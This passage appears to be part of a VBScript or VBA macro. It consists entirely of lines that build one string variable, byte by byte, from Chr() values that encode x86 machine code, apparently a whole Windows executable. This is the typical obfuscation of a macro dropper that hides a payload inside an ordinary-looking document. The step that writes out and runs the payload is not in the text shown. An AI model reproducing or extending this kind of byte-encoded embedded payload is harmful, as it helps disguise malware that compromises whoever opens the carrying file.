ySXd=ySXd&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(138)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(4)&Chr(232)&Chr(223)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(231)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(73)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(201)&Chr(237)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(53)&Chr(86)&Chr(232)&Chr(152)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(39)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)
ySXd=ySXd&Chr(232)&Chr(19)&Chr(226)&Chr(255)&Chr(255)&Chr(83)&Chr(232)&Chr(151)&Chr(232)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(83)&Chr(80)&Chr(232)&Chr(189)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(24)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(72)&Chr(59)&Chr(247)&Chr(117)&Chr(6)&Chr(51)&Chr(246)&Chr(70)&Chr(137)&Chr(117)&Chr(12)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(32)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(191)&Chr(225)&Chr(255)&Chr(255)&Chr(83)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(112)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)
ySXd=ySXd&Chr(20)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(224)&Chr(0)&Chr(117)&Chr(49)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(235)&Chr(18)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(93)&Chr(8)&Chr(106)&Chr(4)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(125)&Chr(228)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(44)&Chr(86)&Chr(232)&Chr(18)&Chr(212)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(210)&Chr(254)
ySXd=ySXd&Chr(255)&Chr(255)&Chr(232)&Chr(147)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(108)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(62)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(6)&Chr(235)&Chr(95)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(110)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(116)&Chr(104)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(113)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(117)&Chr(86)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(52)&Chr(86)&Chr(232)&Chr(169)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(133)
ySXd=ySXd&Chr(192)&Chr(116)&Chr(31)&Chr(131)&Chr(254)&Chr(224)&Chr(118)&Chr(205)&Chr(86)&Chr(232)&Chr(153)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(34)&Chr(206)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(232)&Chr(56)&Chr(200)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(15)&Chr(206)&Chr(255)&Chr(255)&Chr(233)&Chr(124)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(255)&Chr(117)&Chr(22)&Chr(232)&Chr(1)&Chr(206)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(177)&Chr(205)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(139)&Chr(199)&Chr(235)&Chr(210)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(8)&Chr(137)&Chr(125)&Chr(252)&Chr(137)&Chr(117)&Chr(248)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(193)&Chr(233)&Chr(7)&Chr(235)&Chr(6)
ySXd=ySXd&Chr(141)&Chr(155)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(102)&Chr(15)&Chr(111)&Chr(6)&Chr(102)&Chr(15)&Chr(111)&Chr(78)&Chr(16)&Chr(102)&Chr(15)&Chr(111)&Chr(86)&Chr(32)&Chr(102)&Chr(15)&Chr(111)&Chr(94)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(79)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(87)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(95)&Chr(48)&Chr(102)&Chr(15)&Chr(111)&Chr(102)&Chr(64)&Chr(102)&Chr(15)&Chr(111)&Chr(110)&Chr(80)&Chr(102)&Chr(15)&Chr(111)&Chr(118)&Chr(96)&Chr(102)&Chr(15)&Chr(111)&Chr(126)&Chr(112)&Chr(102)&Chr(15)&Chr(127)&Chr(103)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(111)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(119)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(127)&Chr(112)&Chr(141)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(163)&Chr(139)
ySXd=ySXd&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(28)&Chr(137)&Chr(125)&Chr(244)&Chr(137)&Chr(117)&Chr(248)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(195)&Chr(153)&Chr(139)&Chr(200)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(131)&Chr(225)&Chr(15)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(139)&Chr(209)&Chr(11)&Chr(215)&Chr(117)&Chr(74)&Chr(139)&Chr(117)&Chr(16)&Chr(139)&Chr(206)&Chr(131)&Chr(225)&Chr(127)&Chr(137)&Chr(77)&Chr(232)&Chr(59)&Chr(241)&Chr(116)&Chr(19)&Chr(43)&Chr(241)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(39)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(232)
ySXd=ySXd&Chr(133)&Chr(201)&Chr(116)&Chr(119)&Chr(139)&Chr(93)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(211)&Chr(43)&Chr(209)&Chr(137)&Chr(85)&Chr(236)&Chr(3)&Chr(216)&Chr(43)&Chr(217)&Chr(137)&Chr(93)&Chr(240)&Chr(139)&Chr(117)&Chr(236)&Chr(139)&Chr(125)&Chr(240)&Chr(139)&Chr(77)&Chr(232)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(83)&Chr(59)&Chr(207)&Chr(117)&Chr(53)&Chr(247)&Chr(217)&Chr(131)&Chr(193)&Chr(16)&Chr(137)&Chr(77)&Chr(228)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(228)&Chr(243)&Chr(164)&Chr(139)&Chr(77)&Chr(8)&Chr(3)&Chr(77)&Chr(228)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(85)&Chr(228)&Chr(139)&Chr(69)&Chr(16)&Chr(43)&Chr(69)&Chr(228)&Chr(80)&Chr(82)&Chr(81)&Chr(232)&Chr(76)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(26)&Chr(139)&Chr(117)&Chr(12)
ySXd=ySXd&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(193)&Chr(233)&Chr(2)&Chr(243)&Chr(165)&Chr(139)&Chr(202)&Chr(131)&Chr(225)&Chr(3)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(244)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(84)&Chr(198)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(102)&Chr(15)&Chr(40)&Chr(193)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(10)&Chr(61)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(131)&Chr(101)&Chr(228)&Chr(0)
ySXd=ySXd&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(86)&Chr(198)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(51)&Chr(192)&Chr(83)&Chr(137)&Chr(69)&Chr(252)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(156)&Chr(88)&Chr(139)&Chr(200)&Chr(53)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(80)&Chr(157)&Chr(156)&Chr(90)&Chr(43)&Chr(209)&Chr(116)&Chr(31)&Chr(81)&Chr(157)&Chr(51)&Chr(192)&Chr(15)&Chr(162)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(93)&Chr(232)&Chr(137)&Chr(85)&Chr(236)&Chr(137)&Chr(77)&Chr(240)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(162)&Chr(137)&Chr(85)&Chr(252)&Chr(137)&Chr(69)&Chr(248)&Chr(91)&Chr(247)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(116)&Chr(14)&Chr(232)&Chr(92)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(91)&Chr(201)&Chr(195)&Chr(232)&Chr(153)&Chr(255)&Chr(255)&Chr(255)&Chr(163)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(129)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(4)&Chr(232)&Chr(243)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(8)&Chr(232)&Chr(235)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(12)&Chr(232)&Chr(227)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(16)&Chr(232)&Chr(219)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(20)&Chr(232)&Chr(211)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(24)&Chr(232)&Chr(203)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(54)&Chr(232)&Chr(196)&Chr(220)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(118)&Chr(32)&Chr(232)&Chr(188)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(36)&Chr(232)&Chr(180)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(40)&Chr(232)&Chr(172)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(44)&Chr(232)&Chr(164)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(48)&Chr(232)&Chr(156)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(52)&Chr(232)&Chr(148)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(28)&Chr(232)&Chr(140)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(56)&Chr(232)&Chr(132)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(60)&Chr(232)&Chr(124)&Chr(220)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(118)&Chr(64)&Chr(232)&Chr(113)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(68)&Chr(232)&Chr(105)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(72)&Chr(232)&Chr(97)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)
ySXd=ySXd&Chr(76)&Chr(232)&Chr(89)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(80)&Chr(232)&Chr(81)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(84)&Chr(232)&Chr(73)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(88)&Chr(232)&Chr(65)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(92)&Chr(232)&Chr(57)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(96)&Chr(232)&Chr(49)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(100)&Chr(232)&Chr(41)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(104)&Chr(232)&Chr(33)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(25)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(112)&Chr(232)&Chr(17)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(116)&Chr(232)&Chr(9)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(120)&Chr(232)&Chr(1)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(124)&Chr(232)&Chr(249)&Chr(219)
ySXd=ySXd&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(235)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(224)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(213)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(202)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(191)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(148)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(180)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(152)&Chr(0)&Chr(56)&Chr(0)&Chr(232)&Chr(169)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(156)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(158)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(232)
ySXd=ySXd&Chr(147)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(164)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(136)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(168)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(125)&Chr(219)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(44)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(53)&Chr(139)&Chr(6)&Chr(59)&Chr(5)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(90)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(4)&Chr(59)&Chr(5)&Chr(228)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(72)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(118)&Chr(8)&Chr(59)&Chr(53)&Chr(232)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(54)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(94)&Chr(93)
ySXd=ySXd&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(126)&Chr(139)&Chr(70)&Chr(12)&Chr(59)&Chr(5)&Chr(236)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(20)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(16)&Chr(59)&Chr(5)&Chr(240)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(2)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(20)&Chr(59)&Chr(5)&Chr(244)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(240)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(24)&Chr(59)&Chr(5)&Chr(248)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(222)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(28)&Chr(59)&Chr(5)&Chr(252)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(204)
ySXd=ySXd&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(32)&Chr(59)&Chr(5)&Chr(0)&Chr(171)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(186)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(118)&Chr(36)&Chr(59)&Chr(53)&Chr(4)&Chr(171)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(168)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(94)&Chr(93)&Chr(195)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(2)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(194)&Chr(1)&Chr(15)&Chr(171)&Chr(4)&Chr(36)&Chr(235)&Chr(241)&Chr(139)&Chr(117)&Chr(8)&Chr(131)&Chr(201)&Chr(255)&Chr(141)&Chr(73)&Chr(0)&Chr(131)&Chr(193)&Chr(1)&Chr(138)&Chr(6)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(198)&Chr(1)
ySXd=ySXd&Chr(15)&Chr(163)&Chr(4)&Chr(36)&Chr(115)&Chr(238)&Chr(139)&Chr(193)&Chr(131)&Chr(196)&Chr(32)&Chr(94)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(84)&Chr(36)&Chr(4)&Chr(139)&Chr(76)&Chr(36)&Chr(8)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(60)&Chr(139)&Chr(2)&Chr(58)&Chr(1)&Chr(117)&Chr(46)&Chr(10)&Chr(192)&Chr(116)&Chr(38)&Chr(58)&Chr(97)&Chr(1)&Chr(117)&Chr(37)&Chr(10)&Chr(228)&Chr(116)&Chr(29)&Chr(193)&Chr(232)&Chr(16)&Chr(58)&Chr(65)&Chr(2)&Chr(117)&Chr(25)&Chr(10)&Chr(192)&Chr(116)&Chr(17)&Chr(58)&Chr(97)&Chr(3)&Chr(117)&Chr(16)&Chr(131)&Chr(193)&Chr(4)&Chr(131)&Chr(194)&Chr(4)&Chr(10)&Chr(228)&Chr(117)&Chr(210)&Chr(139)&Chr(255)&Chr(51)&Chr(192)&Chr(195)&Chr(144)&Chr(27)&Chr(192)&Chr(209)&Chr(224)&Chr(131)&Chr(192)&Chr(1)&Chr(195)
ySXd=ySXd&Chr(247)&Chr(194)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(24)&Chr(138)&Chr(2)&Chr(131)&Chr(194)&Chr(1)&Chr(58)&Chr(1)&Chr(117)&Chr(231)&Chr(131)&Chr(193)&Chr(1)&Chr(10)&Chr(192)&Chr(116)&Chr(220)&Chr(247)&Chr(194)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(164)&Chr(102)&Chr(139)&Chr(2)&Chr(131)&Chr(194)&Chr(2)&Chr(58)&Chr(1)&Chr(117)&Chr(206)&Chr(10)&Chr(192)&Chr(116)&Chr(198)&Chr(58)&Chr(97)&Chr(1)&Chr(117)&Chr(197)&Chr(10)&Chr(228)&Chr(116)&Chr(189)&Chr(131)&Chr(193)&Chr(2)&Chr(235)&Chr(136)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(2)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(194)&Chr(1)&Chr(15)&Chr(171)&Chr(4)
ySXd=ySXd&Chr(36)&Chr(235)&Chr(241)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(255)&Chr(138)&Chr(6)&Chr(10)&Chr(192)&Chr(116)&Chr(12)&Chr(131)&Chr(198)&Chr(1)&Chr(15)&Chr(163)&Chr(4)&Chr(36)&Chr(115)&Chr(241)&Chr(141)&Chr(70)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(94)&Chr(201)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(193)&Chr(139)&Chr(209)&Chr(3)&Chr(198)&Chr(59)&Chr(254)&Chr(118)&Chr(8)&Chr(59)&Chr(248)&Chr(15)&Chr(130)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(249)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(31)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(22)&Chr(87)&Chr(86)&Chr(131)&Chr(231)&Chr(15)&Chr(131)&Chr(230)&Chr(15)&Chr(59)&Chr(254)&Chr(94)&Chr(95)&Chr(117)&Chr(8)&Chr(94)&Chr(95)&Chr(93)&Chr(233)&Chr(142)
ySXd=ySXd&Chr(250)&Chr(255)&Chr(255)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(21)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(42)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(233)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(3)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(40)&Chr(100)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(168)&Chr(100)&Chr(64)&Chr(0)&Chr(144)&Chr(56)&Chr(100)&Chr(64)&Chr(0)&Chr(100)&Chr(100)&Chr(64)&Chr(0)&Chr(136)&Chr(100)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)
